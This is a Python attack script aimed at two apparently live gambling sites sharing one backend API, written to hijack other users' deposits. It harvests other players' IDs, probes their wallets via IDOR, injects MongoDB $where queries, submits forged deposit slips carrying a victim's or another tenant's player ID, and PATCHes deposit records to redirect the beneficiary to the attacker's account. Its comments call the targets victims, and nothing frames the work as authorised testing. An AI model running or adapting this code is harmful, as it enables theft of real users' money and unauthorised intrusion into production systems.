#!/usr/bin/env python3
"""probe_cross_user_hijack.py — Cross-user transaction hijacking.

   Attack vectors:
   1. IDOR on deposit records - access/modify other users' deposits
   2. Player ID swap - submit deposit claiming another player's ID
   3. Transaction ID hijack - claim pending deposits from other users
   4. Cross-tenant player swap - use we88c deposit flow with vak88z2 player
"""
import json, requests, time, sys
sys.path.insert(0, "nuxt")
from slipgen3 import generate_tx_reference, generate_qr_data
from datetime import datetime, timezone, timedelta

TID_VAK = "af6efb584a3d317b5a11ab6209b88e1b"
TID_WE88C = "54ef7626cb381f4bab8be91f0cdbce47"

PBAPI_VAK = f"https://{TID_VAK}pbapi.asdgapicenterssdo.com"
MGAPI_VAK = f"https://{TID_VAK}mgapi.asdgapicenterssdo.com"
BGAPI_VAK = f"https://{TID_VAK}bgapi.asdgapicenterssdo.com"

PBAPI_WE88C = f"https://{TID_WE88C}pbapi.asdgapicenterssdo.com"
MGAPI_WE88C = f"https://{TID_WE88C}mgapi.asdgapicenterssdo.com"

DOMAIN_VAK = "m.vak88z2.com"
DOMAIN_WE88C = "m.we88c.com"

# Our player
PHONE = "0972571110"
PASS = "Pwned2026!"
OUR_PLAYER_ID = "eea830ab-b187-4f21-9b79-28e2773b2f6b"  # From prior auth

# Auth
def auth(pbapi, phone, password):
    r = requests.post(f"{pbapi}/pb/authentication",
        headers={"Content-Type": "application/json"},
        json={"strategy": "local", "username": phone, "password": password},
        timeout=15)
    if r.status_code in (200, 201):
        return r.json()["accessToken"], r.json().get("id", "?")
    return None, None

print("=== Authenticate ===")
JWT_VAK, player_id_vak = auth(PBAPI_VAK, PHONE, PASS)
JWT_WE88C, player_id_we88c = auth(PBAPI_WE88C, PHONE, PASS)
print(f"  vak88z2: {player_id_vak[:8] if player_id_vak else 'FAIL'}")
print(f"  we88c:   {player_id_we88c[:8] if player_id_we88c else 'FAIL'}")

HDR_VAK = {"Authorization": f"Bearer {JWT_VAK}", "template": "vn", "Content-Type": "application/json"}
HDR_WE88C = {"Authorization": f"Bearer {JWT_WE88C}", "template": "vn", "Content-Type": "application/json"} if JWT_WE88C else {}

def wallet(mgapi, hdr):
    r = requests.get(f"{mgapi}/mb/wallet", headers=hdr, timeout=10)
    if r.ok:
        data = r.json().get("data", [{}])
        return data[0].get("balance", "?") if isinstance(data, list) else "?"
    return f"ERR:{r.status_code}"

print(f"\nWallets: vak88z2={wallet(MGAPI_VAK, HDR_VAK)}, we88c={wallet(MGAPI_WE88C, HDR_WE88C)}")

# ── 1. Find other users' player IDs via NoSQL injection ───────────────────────
print("\n=== 1. Extract other player IDs from latest-win ===")
other_players = set()

# NoSQL to get records with player info
r = requests.get(f"{PBAPI_VAK}/pb/latest-win",
    headers={"Authorization": f"Bearer {JWT_VAK}"},
    params={"domain": DOMAIN_VAK, "$limit": 50},
    timeout=10)
if r.ok:
    items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    for item in items:
        # Look for player-related fields
        for key in ["player_id", "user_id", "member_id", "username", "phone"]:
            if key in item and item[key]:
                val = str(item[key])
                if val != OUR_PLAYER_ID and val != PHONE and len(val) > 5:
                    other_players.add(val)

print(f"  Found {len(other_players)} potential other player IDs")
for p in list(other_players)[:5]:
    print(f"    {p[:30]}...")

# ── 2. IDOR: Try accessing other users' data via BOLA endpoints ───────────────
print("\n=== 2. IDOR on player/user endpoints ===")

# Try to access other player's wallet
for player_id in list(other_players)[:3]:
    for path in [f"/mb/wallet/{player_id}", f"/mb/user/{player_id}",
                 f"/mb/player/{player_id}", f"/mb/balance/{player_id}"]:
        r = requests.get(f"{MGAPI_VAK}{path}", headers=HDR_VAK, timeout=10)
        if r.status_code not in (404, 405):
            print(f"  GET {path}: {r.status_code}")
            if r.ok:
                print(f"    [!!!] {r.text[:150]}")

# ── 3. Player ID swap in deposit request ──────────────────────────────────────
print("\n=== 3. Player ID swap attack ===")

# Get a bank account ID
r = requests.get(f"{BGAPI_VAK}/bo/info/payment-bank-account",
    headers={"Authorization": f"Bearer {JWT_VAK}", "template": "vn"},
    params={"domain": DOMAIN_VAK}, timeout=15)
bank_id = None
if r.ok:
    items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    for item in items[:5]:
        if item.get("is_active") and item.get("id"):
            bank_id = item.get("id")
            break
print(f"  Using bank_id: {bank_id[:8] if bank_id else 'NONE'}")

# Try deposit with different player_id in payload
if bank_id and other_players:
    victim_player = list(other_players)[0]
    print(f"  Attempting deposit with victim player_id: {victim_player[:20]}...")

    now = datetime.now(timezone.utc) + timedelta(hours=7)
    tx = generate_tx_reference(now)
    qr = generate_qr_data(tx)

    # Payload with victim's player_id
    payload = {
        "payment_bank_information_id": bank_id,
        "deposit_amount": 100,
        "note": "$",
        "slip_image_url": f"slip_{tx[:8]}.jpg",
        "qr_string": qr,
        "player_id": victim_player,  # Hijack attempt
        "user_id": victim_player,
        "member_id": victim_player,
    }

    r = requests.post(f"{MGAPI_VAK}/mb/auto-slip-deposit", headers=HDR_VAK,
                      json=payload, timeout=15)
    print(f"  POST auto-slip-deposit (victim player_id): {r.status_code}")
    if r.status_code != 404:
        print(f"    Response: {r.text[:200]}")

# ── 4. Transaction ID hijack via pending deposits ─────────────────────────────
print("\n=== 4. Find and hijack pending deposits ===")

# Look for pending deposit records via NoSQL
nosql_queries = [
    "this.status=='pending'",
    "this.deposit_status=='pending'",
    "this.approved==false",
    "this.is_approved==false",
]

for query in nosql_queries:
    r = requests.get(f"{PBAPI_VAK}/pb/latest-win",
        headers={"Authorization": f"Bearer {JWT_VAK}"},
        params={"domain": DOMAIN_VAK, "$where": query, "$limit": 10},
        timeout=10)
    if r.ok:
        items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
        if items:
            print(f"  [{query[:30]}...] → {len(items)} pending records")
            for item in items[:2]:
                tx_id = item.get("id") or item.get("_id") or item.get("transaction_id")
                amount = item.get("amount") or item.get("deposit_amount")
                player = item.get("player_id") or item.get("user_id")
                print(f"    tx={str(tx_id)[:12]} amount={amount} player={str(player)[:12] if player else '?'}")

# ── 5. Cross-tenant hijack: we88c deposit with vak88z2 player ID ──────────────
print("\n=== 5. Cross-tenant player ID injection ===")

if JWT_WE88C:
    # Try to deposit on we88c but claim vak88z2 player ID
    now = datetime.now(timezone.utc) + timedelta(hours=7, seconds=10)
    tx = generate_tx_reference(now)
    qr = generate_qr_data(tx)

    payload = {
        "deposit_amount": 100,
        "note": "$",
        "slip_image_url": f"slip_{tx[:8]}.jpg",
        "qr_string": qr,
        "player_id": player_id_vak,  # vak88z2 player on we88c
        "user_id": player_id_vak,
        "target_tenant": TID_VAK,  # Try to redirect to vak88z2
    }

    r = requests.post(f"{MGAPI_WE88C}/mb/auto-slip-deposit", headers=HDR_WE88C,
                      json=payload, timeout=15)
    print(f"  POST we88c deposit with vak88z2 player_id: {r.status_code}")
    if r.status_code != 404:
        print(f"    Response: {r.text[:200]}")

# ── 6. Direct PATCH on deposit records ────────────────────────────────────────
print("\n=== 6. PATCH deposit records with our player_id ===")

# Find any deposit record and try to change beneficiary
r = requests.get(f"{PBAPI_VAK}/pb/latest-win",
    headers={"Authorization": f"Bearer {JWT_VAK}"},
    params={"domain": DOMAIN_VAK, "$where": "this._id!=null", "$limit": 5},
    timeout=10)
if r.ok:
    items = r.json() if isinstance(r.json(), list) else r.json().get("data", [])
    for item in items[:3]:
        item_id = item.get("id") or item.get("_id")
        if item_id:
            # Try to PATCH player_id to ours
            for svc in ["latest-win", "deposits", "transactions", "deposit-transactions"]:
                pr = requests.patch(f"{PBAPI_VAK}/pb/{svc}/{item_id}",
                    headers={"Authorization": f"Bearer {JWT_VAK}", "Content-Type": "application/json"},
                    json={
                        "player_id": OUR_PLAYER_ID,
                        "user_id": OUR_PLAYER_ID,
                        "beneficiary_id": OUR_PLAYER_ID,
                    },
                    timeout=10)
                if pr.status_code not in (404, 405):
                    print(f"  PATCH /pb/{svc}/{str(item_id)[:8]}: {pr.status_code}")
                    if pr.ok:
                        print(f"    [!!!] HIJACK POSSIBLE: {pr.text[:100]}")

# ── 7. Try websocket/realtime endpoints for transaction events ───────────────
print("\n=== 7. Check for realtime transaction endpoints ===")

realtime_paths = [
    "/socket.io/",
    "/ws/",
    "/realtime/",
    "/events/",
    "/subscribe/",
    "/transactions/stream",
    "/deposits/events",
]

for path in realtime_paths:
    r = requests.get(f"{MGAPI_VAK}{path}",
        headers=HDR_VAK,
        params={"transport": "polling"},
        timeout=5)
    if r.status_code not in (404, 502):
        print(f"  GET {path}: {r.status_code}")
        if r.ok:
            print(f"    {r.text[:100]}")

# ── Final check ───────────────────────────────────────────────────────────────
time.sleep(2)
print(f"\n=== Final wallets ===")
print(f"  vak88z2: {wallet(MGAPI_VAK, HDR_VAK)}")
print(f"  we88c:   {wallet(MGAPI_WE88C, HDR_WE88C)}")
